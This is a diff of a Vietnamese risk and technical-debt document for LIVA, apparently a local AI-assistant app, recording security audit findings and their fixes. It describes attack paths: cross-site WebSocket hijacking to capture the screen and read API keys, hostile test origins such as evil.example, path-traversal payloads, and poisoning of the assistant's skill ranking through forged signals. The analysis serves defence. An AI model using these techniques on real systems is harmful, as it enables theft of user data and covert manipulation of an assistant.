@@ -1,15 +1,18 @@
 ---
 title: "Nợ kỹ thuật và rủi ro"
-updated: 2026-07-29
-commit: 0fd816c
+updated: 2026-08-01
+commit: 3688b5f
+stale-ok: 98efc55
 status: living
 owns:
   - bang-rui-ro-xep-hang
   - bang-code-mo-coi
 covers:
+  - Cargo.lock
   - Cargo.toml
   - package.json
   - .github/workflows/test.yml
+  - .github/workflows/release.yml
   - data/*
   - liva-desktop/src-tauri/tauri.conf.json
   - liva-desktop/src-tauri/src/lib.rs
@@ -34,6 +37,10 @@ covers:
   - liva-native-core/tests/*
   - liva-ui/package.json
   - liva-ui/src/App.vue
+  - liva-ui/src/*
+  - liva-ui/src/components/dashboard/*
+  - liva-ui/src/composables/*
+  - liva-ui/vitest.config.ts
   - liva-voice/liva_api.py
   - liva-voice/src/*
   - packages/liva-common/tsconfig.json
@@ -41,6 +48,12 @@ covers:
   - scripts/start_all.ps1
 ---
 # Nợ kỹ thuật và rủi ro — LIVA
+
+> **Delta 30/07/2026:** các kết luận chi tiết về crypto, Stronghold, WebSocket, model path,
+> SQLite schema và backup trong khảo sát cũ có thể phản ánh thời điểm trước schema v5. Nguồn chuẩn
+> hiện hành là [Persistence runtime](../03-he-thong-con/persistence.md) và
+> [Threat model](../05-chat-luong/threat-model.md); bảng xếp hạng trong tài liệu này vẫn là backlog
+> tổng hợp và phải được đối chiếu với hai nguồn đó trước khi triển khai.
 
 [⬆ Mục lục](../README.md) · [◀ Đối chiếu tuyên bố và thực tế](01-doi-chieu-tuyen-bo-vs-thuc-te.md) · [Lộ trình sửa lỗi và nâng cấp ▶](03-lo-trinh-sua-loi-va-nang-cap.md)
 
@@ -69,12 +82,33 @@ Nhãn trạng thái dùng xuyên suốt bộ tài liệu:
 >
 > | Mục | Còn tồn |
 > |---|---|
-> | C1 | Lớp 2 (token phiên) **cố ý không làm** — với kẻ tấn công đã có mặt trên localhost, token cùng máy không tạo ranh giới thật. Allow-list lệnh theo kênh vẫn chưa có |
+> | C1 | Đã có identity/authorization theo principal. Loopback remote không cần bearer nhưng chỉ được allow-list chat/voice/health; non-loopback dùng shared bearer, chưa phải device identity/mTLS |
 > | C3 | `DEFAULT_ENCRYPTION_KEY` vẫn là đường thoát cho dữ liệu dev: cảnh báo lớn, **không** chặn boot |
 > | H4 | **Chưa có bước xác nhận cho hành động vật lý** — bắt buộc phải có trước khi nối phần cứng smart home thật |
 > | H5 | Thiếu `vec0` vẫn chặn boot; chỉ khác là nay báo rõ cách sửa, chưa có chế độ suy giảm memory-only |
 >
 > **MEDIUM và LOW chưa được rà lại trong đợt 26/07/2026.** Ghi rõ ở đây thay vì để người đọc tưởng cả tài liệu vừa được xác minh — xem [U4 trong backlog nâng cấp](05-nang-cap-toan-dien.md).
+
+### Snapshot kiểm toán nghiêm khắc — 31/07/2026
+
+Snapshot này đo trên commit `3688b5f` **cộng working tree chưa commit**. Nó không thay thế hồ sơ
+lịch sử C/H/M/L bên dưới. Các mục `A31-*` là blocker và nợ mới phát hiện bằng lệnh tái lập; vì vậy
+không được đọc dòng “CRITICAL 3/3 đã khép” ở bảng trên thành “hệ thống đã sẵn sàng phát hành”.
+
+| ID | Ưu tiên | Vấn đề hiện hành | Bằng chứng đo được | Hệ quả | Điều kiện nghiệm thu | Trạng thái |
+|---|---|---|---|---|---|---|
+| ~~**A31-01**~~ | **P0** | Supply chain Rust/npm từng đỏ | **Đã khép 31/07/2026:** `crossbeam-epoch 0.9.18 → 0.9.20`; `plist 1.9 → 1.10`; `wayland-scanner 0.31.10 → 0.31.11`; ba bản `quick-xml` dễ tổn thương được gom về `0.41`. `xcb 1.7.0` crates.io chưa phát hành parser mới nên tạm pin đúng upstream commit `ae3b2cd`; gỡ pin khi release kế tiếp chứa commit này. npm đã nâng `adm-zip 0.6.0`, `sharp 0.35.3`, `tar 7.5.22`; Vault tests chuyển Jest → Vitest; Vue Test Utils pin `2.2.7` để bỏ hẳn nhánh `js-beautify` lỗi | Không còn advisory có mức vulnerability trong hai lockfile. `cargo audit` vẫn liệt kê **21 warning** unmaintained/unsound từ cây Tauri/GTK/transitive; đây là backlog ecosystem, owner platform, rà lại **31/08/2026**, không phải allowlist lỗ hổng runtime | `cargo audit` exit 0; cả `npm audit --audit-level=high` và `npm audit --omit=dev --audit-level=high` exit 0; core 503 tests, desktop security/capability tests, UI 275 tests/build, Vault 27 tests/typecheck/build, mobile build và installer 20 tests đều xanh | **ĐÃ KHÉP 31/07/2026** |
+| ~~**A31-02**~~ | **P1** | Security beta gate từng còn transcript/checkpoint plaintext và recovery drill tách rời backup | **Đã khép 31/07/2026:** [ADR-001](../01-kien-truc/adr-001-ma-hoa-du-lieu-ca-nhan-beta.md) chọn field encryption; checkpoint và `conversation_turn` dùng AES-GCM v2; conversation bỏ FTS plaintext nhưng dense recall vẫn giải mã đúng. Boot cứu plaintext/KEY_OLD rồi `secure_delete` + truncate WAL + `VACUUM`. Manifest backup v2 gắn key-ID; restore sai key từ chối trước target, đúng recovery key đọc lại canary. CSP self-only đã có regression gate | Raw DB/WAL/backup không còn canary theo policy beta; ciphertext locked được giữ nguyên; restore không còn âm thầm tạo DB không đọc được bằng key hiện hành | Checkpoint/conversation/migration, `crypto_boot_e2e`, `sqlite_backup_restore`, capability/CSP tests đều xanh; toàn bộ checklist §9 threat model đã được đánh dấu | **ĐÃ KHÉP 31/07/2026** |
+| ~~**A31-03**~~ | **P1** | CI từng thiếu format và Rust advisory gate | **Đã khép 31/07/2026:** `.github/workflows/test.yml` chạy full `npm audit --audit-level=high`, `cargo fmt --all -- --check`, cài bản cố định `cargo-audit 0.22.2 --locked`, rồi chạy `cargo audit` trước compile/test | PR không còn xanh nếu format drift hoặc một advisory mới xuất hiện trong npm/Cargo lockfile | Local `cargo fmt --all -- --check`, `cargo audit`, full/runtime npm audit đều exit 0; workflow parse YAML thành công và có đủ bốn step security/format | **ĐÃ KHÉP 31/07/2026** |
+| **A31-04** | **P1** | God-file và command hub làm tăng blast radius | **Milestone 1 đạt 31/07:** 7 skill command sang `commands/skill_store.rs`, deletion sang `db/deletion.rs`; `handle_command` còn 140 dòng. Inline tests sang `lib_tests.rs`, `db/tests.rs`, `db/encryption_tests.rs`, `main_tests.rs`; `lib.rs` 1.549, `db.rs` 1.641, `main.rs` 266 dòng. Không còn file >2.000; số file >1.000 giảm **14→13**. Hotspot đầu bảng còn `agent/graph.rs` 1.871, `WidgetApp.vue` 1.793, `MemoryViewer.vue` 1.773 | Command blast radius và nhiễu test/production đã giảm; các hotspot domain/UI vẫn lớn | Bước kế: tách `agent/graph.rs`, Widget và MemoryViewer theo bounded slice; mỗi lát giữ contract + coverage gate | **MỞ — milestone 1 hoàn tất, chương trình nhiều bước tiếp tục** |
+| **A31-05** | **P1** | Working tree hiện tại quá lớn cho một đơn vị review an toàn | `gitnexus detect-changes --scope all` sau reindex 31/07/2026: **139 file, 623 symbol, 166 execution flow, risk CRITICAL** | Một review duy nhất khó chứng minh security, persistence, Tauri capability, UI contract và tài liệu đều nhất quán; rollback không còn cục bộ | Chia thành các lát độc lập theo security/persistence/Tauri/UI/docs; mỗi lát có acceptance command riêng và `detect-changes` sau sửa; không trộn commit mã nguồn với commit cập nhật `commit:` tài liệu | **RỦI RO PHIÊN LÀM VIỆC** |
+| ~~**A31-06**~~ | **P2** | Coverage UI từng đạt gate tổng nhưng còn hotspot yếu | **Đã khép 31/07/2026:** thêm 10 test hành vi cho vision, widget reconnect/session/event/message/audio/drag và callback cleanup. Snapshot mới: 285 test; tổng **68,23% statement · 49,95% branch · 54,40% function · 70,46% line**. `WidgetApp.vue` **70,27% line**, `useGateway.ts` **50,13%**, `VisionView.vue` **100%** | Ba hotspot không còn ẩn dưới số tổng; `vitest.config.ts` có chốt per-file 50% line, không chỉ ghi mức đạt vào tài liệu | `npm run test:coverage -w liva-ui` exit 0 với 29 file/285 test; không hạ ngưỡng toàn cục | **ĐÃ KHÉP 31/07/2026** |
+| ~~**A31-07**~~ | **P2** | Gate tài liệu từng xanh nhưng vẫn để drift đi qua | **Đã khép 31/07/2026:** đối chiếu code thật và sửa các living docs; IPC chuyển từ bảng 44 lệnh lỗi thời sang catalog 76 lệnh/11 miền; model full sửa 29 file/5,95 GiB; runtime thêm setup/boot remediation; khảo sát CI 22/07 được freeze và thay bằng contract hiện hành; hướng dẫn người dùng sửa recovery DB; các cụm vision/proactive/governor và desktop/frontend đã có owner mới | Inventory phân loại 96 tài liệu; không dùng `stale-ok` hoặc bump commit mù. Workflow chạy capability-policy tests thay vì chỉ `cargo check` | `npm run docs:check` exit 0, **không còn cảnh báo stale**, capability/inventory/citation gates đều xanh; citation mơ hồ giảm còn 207 | **ĐÃ KHÉP 31/07/2026** |
+| ~~**A31-08**~~ | **P2** | Gate review AI DevKit từng không chạy do package ngoài thiếu dependency | **Đã khép 31/07/2026:** upstream `ai-devkit@0.47.0` đã sửa đường import; LIVA pin exact version trong lockfile, thêm `devkit:lint`, 5 pointer `docs/ai/*/README.md` trỏ về canonical docs thay vì nhân đôi nội dung, và đưa gate vào CI sau `npm ci` | `memory search` dùng được; lint không còn phụ thuộc `latest` trôi nổi. Năm pointer được inventory phân loại `MERGE` | `npm run devkit:lint` exit 0; `npx --no-install ai-devkit memory search ...` exit 0; full npm audit 0 vulnerability; docs gate sạch 91 tài liệu | **ĐÃ KHÉP 31/07/2026** |
+
+**Ba ưu tiên cao nhất theo security/data-loss trước:** `A31-01` → `A31-02` → `A31-03`.
+`A31-05` phải được xử lý về phạm vi trước khi sửa đồng thời ba nhóm này; đây là quy tắc delivery,
+không phải lý do trì hoãn blocker bảo mật.
 
 **Điểm tốt cần ghi nhận trước** (đã kiểm chứng, không phải lời khen xã giao):
 
@@ -84,8 +118,8 @@ Nhãn trạng thái dùng xuyên suốt bộ tài liệu:
 
 ```mermaid
 flowchart LR
-    A["Tab trình duyệt bất kỳ<br/>(quảng cáo, trang lạ)"] -->|"new WebSocket('ws://127.0.0.1:8002/ws')"| B["accept_hdr_async<br/>main.rs:446-492<br/>CHỈ kiểm uri().path()"]
-    B --> C["OP_AUTH_HANDSHAKE 0x00<br/>main.rs:580-587<br/>chỉ echo payload"]
+    A["Tab trình duyệt bất kỳ<br/>(quảng cáo, trang lạ)"] -->|"new WebSocket('ws://127.0.0.1:8002/ws')"| B["accept_hdr_async<br/>liva-native-core/src/websocket.rs:300-405<br/>CHỈ kiểm uri().path()"]
+    B --> C["OP_AUTH_HANDSHAKE 0x00<br/>liva-native-core/src/websocket.rs:569-578<br/>chỉ echo payload"]
     C --> D["IpcRequest → handle_command<br/>websocket.rs#handle_ws_connection<br/>KHÔNG allow-list"]
     D --> E1["vision:capture<br/>lib.rs:249-273<br/>ảnh màn hình base64"]
     D --> E2["get_config<br/>lib.rs:351-358<br/>ai.cloudApiKey"]
@@ -100,230 +134,43 @@ flowchart LR
 
 | # | Vấn đề | Bằng chứng | Hệ quả | Đề xuất |
 |---|---|---|---|---|
-| **C1** ⚠️ **LỚP 1 ĐÃ SỬA 21/07/2026** | **WebSocket 8002 không xác thực, không kiểm `Origin` → Cross-Site WebSocket Hijacking** | `main.rs:446-492` `accept_hdr_async` **chỉ kiểm `req.uri().path()`**; `main.rs:580-587` `OP_AUTH_HANDSHAKE` chỉ **echo**; `websocket.rs#handle_ws_connection` `IpcRequest` → thẳng `handle_command` **không allow-list** | WebSocket **không** chịu Same-Origin Policy. Bất kỳ tab trình duyệt nào cũng có thể `new WebSocket("ws://127.0.0.1:8002/ws")` và: chụp + rút ảnh màn hình (`vision:capture`), đọc `ai.cloudApiKey` (`get_config`), đọc bộ nhớ/hồ sơ cá nhân, gửi tin Telegram, ghi đè config. Bind `127.0.0.1` **không bảo vệ** trước lớp tấn công này | **Đã làm (F4 lớp 1):** allow-list `Origin` qua `origin_allowed` (`lib.rs`), handshake sai origin bị trả **403 ngay ở tầng HTTP** (`main.rs:478`) chứ không phải hoàn tất rồi đóng. Mặc định cho `localhost:5173`, `127.0.0.1:5173`, `tauri://localhost`, `https://tauri.localhost`; mở rộng bằng `LIVA_WS_ALLOWED_ORIGINS`. 6 unit test gồm ca tấn công thật (`https://evil.example`, `null`, và các biến thể tiền tố/hậu tố như `http://localhost:5173.evil.example`). **CHƯA làm (lớp 2 — token phiên):** xem phân tích ở dưới, giá trị thực tế rất thấp so với thiết kế ban đầu. **CHƯA làm:** allow-list lệnh theo kênh |
-| ~~**C2**~~ ✅ **ĐÃ SỬA 22/07/2026** | **`llm:swap_model` nạp file tùy ý từ đường dẫn client cung cấp** | `lib.rs#validate_model_path` (hàm thuần có test) bắt buộc: đuôi `.gguf` (không phân biệt hoa thường), **nằm trong** thư mục model đã cấu hình, chặn `..` kể cả dạng lồng `sub/../../x.gguf` | Áp ở **hai** chỗ, không chỉ một: nhánh `llm:swap_model` (nay ở `commands/llm.rs` sau khi tách `handle_command`) **và** điểm nạp thật `load_configured_router_model` — nên `update_config` ghi `ai.routerModel` độc hại cũng bị chặn khi reload. Đây là điểm đáng ghi nhận: vá ở cả đường ghi cấu hình chứ không chỉ đường lệnh trực tiếp | `validate_model_path_tests` (`lib.rs#validate_model_path_tests`) phủ đúng các payload nêu ở cột bằng chứng cũ. UI không gọi `swap_model` nên vá không phá client nào |
+| ~~**C1**~~ ✅ **ĐÃ KHÉP 31/07/2026** | **WebSocket 8002 từng không có identity/authorization** | Handshake hiện kiểm path, Origin và bearer khi non-loopback; ticket Tauri 256-bit TTL 30 giây single-use cấp principal đặc quyền; client không được tự khai principal; mọi command đi qua allow-list theo principal (`liva-native-core/src/websocket.rs:118-185`, `liva-native-core/src/websocket.rs:300-405`, `liva-native-core/src/authorization.rs:10-137`) | Tab web lạ bị chặn ở Origin; kết nối remote mặc định chỉ gọi được chat/voice/health; replay/expired/non-loopback ticket và command vượt quyền bị từ chối | Residual: loopback remote không bearer nhưng allow-list hẹp; bearer non-loopback là shared secret, chưa phải mTLS/device identity. Negative tests khóa toàn bộ invariants này |
+| ~~**C2**~~ ✅ **ĐÃ SỬA 22/07/2026** | **`llm:swap_model` nạp file tùy ý từ đường dẫn client cung cấp** | `lib.rs#validate_model_path` (hàm thuần có test) bắt buộc: đuôi `.gguf` (không phân biệt hoa thường), **nằm trong** thư mục model đã cấu hình, chặn `..` kể cả dạng lồng `sub/../../x.gguf` | Áp ở **hai** chỗ, không chỉ một: nhánh `llm:swap_model` (nay ở `commands/llm.rs` sau khi tách `handle_command`) **và** điểm nạp thật `load_configured_router_model` — nên `update_config` ghi `ai.routerModel` độc hại cũng bị chặn khi reload. Đây là điểm đáng ghi nhận: vá ở cả đường ghi cấu hình chứ không chỉ đường lệnh trực tiếp | `validate_model_path_tests` (`liva-native-core/src/lib_tests.rs:331`) phủ đúng các payload nêu ở cột bằng chứng cũ. UI không gọi `swap_model` nên vá không phá client nào |
 | ~~**C3**~~ ✅ **ĐÃ SỬA 22/07/2026 (còn 1 khoản nợ có chủ đích)** | **`EncryptionEngine`: khoá mặc định công khai, không KDF, giải mã fail-open** | Định dạng **v2** có version-tag (`V2_PREFIX = "v2:"`, `crypto.rs:13`): **HKDF-SHA256 + salt 16 byte mỗi bản ghi** (`derive_key`, `crypto.rs:114`), `info` cố định ràng khoá vào đúng mục đích. `try_decrypt` (`crypto.rs:233`) trả `Result<_, DecryptError>`; `read_fact` trả `FactRead::Ok | FactRead::Locked{reason}` | **Hết fail-open.** Sửa DB → `AuthFailed` → `FactRead::Locked`, **không** trả rác vào prompt; đổi khoá → bản ghi cũ hiện là *khoá-chết* có nhãn chứ không im lặng thành hex. `Locked` **không mang ciphertext ra ngoài**, chỉ `reason` thô, nên caller log/serialize cũng không rò. Khoá boot per-machine qua DPAPI + `resolve_and_rekey` | **Khoản nợ CÒN LẠI, có chủ đích:** `DEFAULT_ENCRYPTION_KEY` (`crypto.rs:16`) vẫn tồn tại làm đường thoát cho dữ liệu dev — dùng nó thì **cảnh báo lớn một lần** (`crypto.rs:95`) nhưng **không chặn boot**. Đây là quyết định đã ghim, không phải sơ suất; xem §8 của [backlog nâng cấp](05-nang-cap-toan-dien.md) |
 
-### C1. WebSocket 8002 không xác thực → lộ toàn bộ tập lệnh IPC
+### C1. WebSocket 8002 — identity và authorization đã khép 31/07/2026
 
-**Bằng chứng chi tiết:**
+Phát hiện gốc là đúng tại thời điểm khảo sát: loopback WebSocket từng chỉ kiểm path,
+`OP_AUTH_HANDSHAKE` chỉ echo, và mọi text command đi thẳng vào dispatcher. Trạng thái
+hiện hành đã thay đổi ở cả ba lớp:
 
-- `liva-native-core/src/main.rs:446-492` — `start_websocket_server`: `accept_hdr_async` với callback **chỉ kiểm `req.uri().path() == "/ws"`** (`main.rs:468-472`). Không đọc header `Origin`, không token, không handshake bí mật.
-- `main.rs:580-587` — `OP_AUTH_HANDSHAKE` (0x00) chỉ **echo lại payload** của client, không xác thực gì.
-- `websocket.rs#handle_ws_connection` — nhánh `Message::Text` fallthrough parse `IpcRequest { id, command, payload }` rồi gọi thẳng `handle_command(state, &req.command, req.payload, ...)`. **Không allow-list.**
-- `main.rs:953-956` — nhánh `_ =>` của legacy-event cũng gọi `handle_command` với `event_name` tùy ý.
-- Bề mặt lộ ra (`liva-native-core/src/lib.rs`): `vision:capture` (`lib.rs:249-273`, trả **ảnh màn hình base64 nguyên frame**), `get_config` (`lib.rs:351-358`, đọc `data/liva-config.json` **nguyên văn**, tức là `ai.cloudApiKey`, `ai.cloudBaseUrl`), `get_memory_data`, `get_user_profile`, `memory:get_fact`, `telegram:send_text`, `update_config`, `llm:swap_model`.
-- `main.rs:830-895` — sự kiện `user_voice_command` chứa chuỗi `"màn hình"`/`"screen"` sẽ tự chụp màn hình (`capture_for_vision()`) và **stream mô tả nội dung màn hình về client**.
+- **Handshake HTTP:** chỉ nhận path `/ws`, kiểm `Origin`, giới hạn frame/message 1 MiB.
+  Bind non-loopback bắt buộc `Authorization: Bearer <LIVA_WS_AUTH_TOKEN>` và so sánh
+  constant-time (`liva-native-core/src/websocket.rs:118-152`,
+  `liva-native-core/src/websocket.rs:300-383`).
+- **Identity:** kết nối không có session luôn là `WebSocketRemote`; client không được tự
+  khai `principal`. Widget/dashboard chỉ nâng quyền bằng ticket 256-bit, TTL 30 giây,
+  single-use do đúng Tauri window/capability cấp; ticket đặc quyền bị từ chối ngoài
+  loopback (`liva-native-core/src/websocket.rs:95-110`,
+  `liva-native-core/src/websocket.rs:155-177`,
+  `liva-desktop/src-tauri/src/lib.rs:506-543`).
+- **Authorization:** mọi text command và legacy event đi qua `handle_command_as` /
+  `authorize_websocket_event`. Remote chỉ có 9 lệnh chat/voice/health; widget,
+  dashboard, setup và Telegram có allow-list riêng, mặc định từ chối
+  (`liva-native-core/src/authorization.rs:10-137`,
+  `liva-native-core/src/websocket.rs:180-185`,
+  `liva-native-core/src/websocket.rs:1422-1512`).
 
-**Hệ quả:** WebSocket **không** chịu Same-Origin Policy. Bất kỳ tab trình duyệt nào người dùng mở (quảng cáo, trang bất kỳ) đều có thể mở kết nối và ngay lập tức: chụp + rút ảnh màn hình, đọc API key cloud, đọc toàn bộ bộ nhớ dài hạn/hồ sơ cá nhân, gửi tin Telegram mạo danh, ghi đè config. Bind mặc định `127.0.0.1` (`main.rs:452`) **không hề bảo vệ** trước lớp tấn công này. Nếu ai đặt `LIVA_SERVER_HOST=0.0.0.0` thì thành RCE-adjacent trên LAN.
+`OP_AUTH_HANDSHAKE` vẫn echo để tương thích framing cũ; nó **không còn là hàng rào
+xác thực**. Hàng rào thật nằm ở HTTP handshake, session authority và principal-aware
+authorization trước dispatcher. Các negative test khóa origin lạ, bearer sai, principal
+tự khai, ticket replay/hết hạn/non-loopback và command vượt quyền.
 
-**Đề xuất:** (1) Bắt buộc kiểm `Origin` — chỉ chấp nhận `null`/`tauri://localhost`/`http://localhost:5173`; từ chối mọi origin khác ở tầng `accept_hdr_async`. (2) Sinh token phiên ngẫu nhiên lúc khởi động, ghi vào file chỉ user đọc được, client phải gửi trong `OP_AUTH_HANDSHAKE` — và **thực sự kiểm** thay vì echo. (3) Allow-list lệnh theo kênh: kênh WS chỉ được gọi tập lệnh voice/UI; các lệnh nhạy cảm (`vision:*`, `llm:swap_model`, `update_config`, `telegram:*`) chỉ qua IPC Tauri.
-
-#### C1.1 Bề mặt lộ ra ĐANG LỚN DẦN — cập nhật 26/07/2026 (U19)
-
-Lớp 1 (allow-list `Origin`) đã chặn trang web; đề xuất (3) — **allow-list lệnh theo kênh** — thì
-vẫn **CHƯA làm**. Điều đó cũ, nhưng có một biến số mới: **danh mục `mcp:call_tool` đang mở rộng.**
-
-U19 (`6b5b87b`) thêm `control_volume` và `control_media` (`integrations/os_control.rs`) vào
-`NativeMcpServer`, đưa danh mục từ 4 → **6 tool**. Đây là lần đầu tập lệnh IPC có tool **tổng hợp sự
-kiện nhập liệu của OS** (`SendInput` với phím đa phương tiện) chứ không chỉ đọc/ghi dữ liệu của
-chính LIVA.
-
-**Một chi tiết dễ đọc nhầm, cần nói rõ:** ~~`NATIVE_AUTOEXEC` trong `llm/tool_calling.rs` **không
-phải hàng rào của `mcp:call_tool`** … bất kỳ client nào nối được vào lớp lệnh đều gọi được cả 6
-tool, bất kể `LIVA_TOOL_CALLING` bật hay tắt.~~
-
-**ĐÃ SỬA 26/07/2026** — chẩn đoán trên đúng ở thời điểm viết, và là lý do bản vá tồn tại. Nay cả
-hai nhánh gọi tool trực tiếp đều qua `llm::tool_calling::guard_direct_call`:
-
-| Nhánh | Trước | Nay |
-|---|---|---|
-| `mcp:call_tool` (6 tool nội bộ) | không kiểm gì | `write_markdown` **bị chặn**; `read_markdown` / `search_vault` / `control_smarthome` / `control_volume` / `control_media` vẫn qua |
-| `mcp_client:call_tool` (**mọi** tool trên **mọi** server MCP ngoài) | không kiểm gì | mặc định **TỪ CHỐI HẾT** |
-
-Nhánh thứ hai nghiêm trọng hơn nhánh mà mục này ban đầu nêu: nó tới được tiến trình `npx`/`docker`
-của người lạ với đúng quyền chúng có. Mở bằng `LIVA_MCP_AUTOEXEC=server/tool` (hoặc `server/*`), và
-thông báo lỗi in ra **chính xác** chuỗi cần đặt.
-
-Đo, không suy luận: bỏ dòng `LIVA_MCP_AUTOEXEC` khỏi `scripts/verify-mcp-real.mjs` làm 4 mục
-`call_tool` đỏ ngay (15/15 → 11/15); đặt lại thì xanh. Cộng hai test hồi quy trong
-`tests/mcp_client_e2e.rs` chứng minh hàng rào nằm **trong arm** chứ không chỉ tồn tại như một hàm.
-
-**Bản vá này KHÔNG đóng §C1.** Nó chỉ đóng hai lệnh MCP; các lệnh khác trên cùng đường WS 8002
-không xác thực vẫn mở (`llm:swap_model` là §C2). Đề xuất (3) — allow-list lệnh theo kênh — **vẫn
-chưa làm**, và nhận xét ở gạch đầu dòng cuối vẫn nguyên giá trị.
-
-#### C1.2 Bề mặt lại lớn thêm — rung G2 thêm 5 lệnh, một lệnh GHI ĐĨA
-
-Cùng ngày, rung G2 (kho skill cục bộ) thêm vào **đúng lớp lệnh này**: `skills:sync` ·
-`skills:list` · `skills:search` · `skills:history` · `skills:pin_ids`. Bốn lệnh đầu chỉ đọc;
-**`skills:pin_ids` ghi file** (`.skill_id`) vào từng thư mục skill.
-
-**Một chỗ đã suýt tệ hơn hẳn.** Bản đầu của năm arm này nhận `payload.path` — nghĩa là kẻ gọi chọn
-được thư mục để LIVA **quét** và, với `pin_ids`, **ghi vào**. Trên một socket chưa xác thực, đó là
-traversal do kẻ gọi điều khiển: một oracle đọc file tên `SKILL.md` ở đường dẫn tuỳ ý, cộng khả năng
-tạo file ở thư mục tuỳ ý (giới hạn ở tên `.skill_id`, trong thư mục đã có `SKILL.md`).
-
-Đã bỏ hẳn `path` khỏi payload. Gốc kho chỉ đến từ `LIVA_SKILLS_DIR` (mặc định `skills`) — **cấu
-hình là việc của người vận hành, không phải của một field JSON đến từ socket.**
-
-Còn lại, nói đúng mức:
-
-- Năm lệnh vẫn **gọi được bởi bất kỳ client nào lọt allow-list `Origin`**, y như mọi lệnh khác.
-- Thiệt hại của `skills:pin_ids` bị chặn hai lớp: chỉ ghi trong cây `LIVA_SKILLS_DIR`, chỉ tên
-  `.skill_id`, và chỉ cho thư mục **chưa có** file đó. Không ghi đè gì.
-- `skills:search` trả `name`/`description` đọc từ đĩa. Với gốc kho do người vận hành đặt, đó không
-  còn là oracle đọc file tuỳ ý.
-
-**Xu hướng mới là điều đáng lo, không phải từng lệnh.** Trong một ngày: 4 → 6 tool (U19), rồi
-+5 lệnh (G2), rồi hai hàng rào allowlist phải thêm vào sau (§C1.1). Mỗi lần đều "nhỏ và có biện
-minh". Đề xuất (3) — **allow-list lệnh theo kênh** — nay là thứ khiến những lần sau không phải
-tranh luận lại từ đầu; nó vẫn **chưa làm**, và mỗi rung mới làm việc trì hoãn đắt thêm.
-
-Đánh giá mức độ, không thổi phồng:
-
-- **Không phải lỗ hổng mới.** Đối tượng chạm tới được là *tiến trình cục bộ dưới cùng user* — đúng
-  đối tượng mà phân tích F4 lớp 2 đã kết luận là token-trong-file không chặn nổi. Trang web vẫn bị
-  lớp 1 chặn bằng `Origin`.
-- **Nhưng bề mặt đổi chất.** Trước đây kịch bản xấu nhất là *rò dữ liệu* (ảnh màn hình, API key, ký
-  ức). Nay có thêm *tác động ra ngoài tiến trình*: gõ phím đa phương tiện vào shell Windows. U19
-  chọn đúng ranh giới — chỉ tool **đảo ngược được** mới vào `NATIVE_AUTOEXEC` — và ranh giới đó ổn.
-  Rủi ro không nằm ở hai tool này mà ở **tiền lệ**: tool thứ bảy không đảo ngược được mà lọt vào
-  danh mục sẽ thừa hưởng đúng đường đi không có allow-list này.
-- ⇒ **Đề xuất (3) nay đắt hơn khi trì hoãn.** Nên làm trước khi thêm tool OS tiếp theo, không phải
-  sau.
-
-#### C1.3 Rung G3 thêm 2 lệnh, và một loại tác động MỚI: đầu độc xếp hạng
-
-Cùng ngày, G3 (sổ cái chất lượng) thêm `skills:signal` (ghi) và `skills:signals` (đọc) vào **đúng lớp
-lệnh này**. `skills:signal` ghi dòng vào bảng `skill_signals`.
-
-Điều đáng nói không phải "lại thêm hai lệnh ghi" — mà là **loại tác động này chưa từng có trên bề mặt
-đó**. Các lệnh ghi trước đây đổi *dữ liệu*; `skills:signal` đổi **thứ tự truy hồi của những lượt sau**.
-Một kẻ gọi khai một loạt `tool_failure_affects_skill` giả lên một skill là làm skill đó **tụt hạng
-trong mọi lần `skills:search` về sau** — không phải rò gì, không phải chạy gì, mà là bẻ chất lượng
-của trợ lý theo hướng người ngoài chọn. Không có log nào phân biệt được tín hiệu thật với tín hiệu
-khai bừa, vì đúng bản chất thiết kế: chỉ người gọi biết lỗi có phải do skill hay không (§3 G3).
-
-Cái chặn nó, nói đúng mức — **có chặn trên, không phải vô hại**:
-
-- Hình phạt cộng trên **thứ hạng** và bị chặn ở `LAMBDA_HANG = 3` ⇒ dìm được tối đa ~3 bậc, không bao
-  giờ loại hẳn một skill khỏi kết quả hay đẩy một skill không liên quan lên đầu.
-- `merge_key` được đếm **phân biệt**, nên spam cùng một khoá 10.000 lần bằng đúng một vấn đề. Muốn
-  tăng mức phạt thì phải bịa ra các khoá khác nhau — làm được, nhưng bão hoà hyperbol khiến vấn đề
-  thứ mười gần như không thêm gì so với thứ ba.
-- Hình phạt **không bao giờ đạt 1,0**, và `evidence_status = "refuted"` đưa trọng số về 0 ⇒ có đường
-  hồi phục mà không phải xoá dữ liệu.
-- Tổng lại: kịch bản xấu nhất là *nhiễu thứ hạng có biên*, không phải chiếm quyền. Nhưng nó **im
-  lặng** — không có cảnh báo nào khi sổ cái bị bơm, và `skills:search` chỉ nói `priorApplied: true`.
-
-Một chỗ **chưa chặn**: không có giới hạn tần suất nào trên `skills:signal`, nên bảng `skill_signals`
-tăng không biên. Thiệt hại là đĩa và thời gian truy vấn, không phải tính đúng đắn (nhờ đếm phân biệt).
-`ON DELETE CASCADE` chỉ dọn khi skill bị xoá.
-
-⇒ **Đây là rung thứ ba trong một ngày làm đề xuất (3) đắt thêm.** Đếm lại: 4 → 6 tool (U19), +5 lệnh
-(G2), +2 lệnh (G3), cộng hai hàng rào allowlist phải thêm sau (§C1.1). Allow-list lệnh theo kênh vẫn
-**chưa làm**. Với G3 thì nó có thêm một lý do cụ thể: `skills:signal` là lệnh mà một kênh chỉ-đọc
-(ví dụ UI hiển thị) **không có việc gì** phải gọi được.
-
-**Ngoài phạm vi bảo mật, một số đo cần giữ lại:** vòng G1 cộng **2 700–3 000 ms mỗi lượt chat** vì
-nó thêm một lượt LLM cho *mọi* câu. Đó là lý do `LIVA_TOOL_CALLING` mặc định **TẮT**, và là con số
-phải đặt lên bàn mỗi khi ai đó đề nghị bật mặc định.
-
-Prior của G3 thì **không** cộng chi phí LLM nào — nó là một truy vấn `GROUP BY` cộng một phép sắp.
-Nhưng nó thêm **một truy vấn DB cho mỗi `skills:search`**, và chưa ai đo số đó dưới tải.
-
-#### C1.4 Lần đầu rung theo chiều NGƯỢC lại — bịt một đường thoát vault, 28/07/2026 (`241e8f9`)
-
-Ba mục trên đều ghi bề mặt **lớn thêm**. Mục này ghi lần đầu nó **hẹp lại**, và đáng ghi riêng vì
-lỗ được bịt thuộc lớp mà hai lớp kiểm cũ **không thể** bắt.
-
-`NativeMcpServer::resolve_path` trước đó có hai lớp, **cả hai đều thuần cú pháp**: lớp một chặn
-đường dẫn tuyệt đối và `..`; lớp hai `starts_with` sau `join` để bắt dạng drive-relative Windows
-(`C:foo`) — dạng mà `join` âm thầm *thay thế* cả path. Cả hai chỉ nhìn chuỗi.
-
-Một junction hoặc symlink **nằm trong vault** mà trỏ ra ngoài đi lọt cả hai: `thoat/bi-mat.txt`
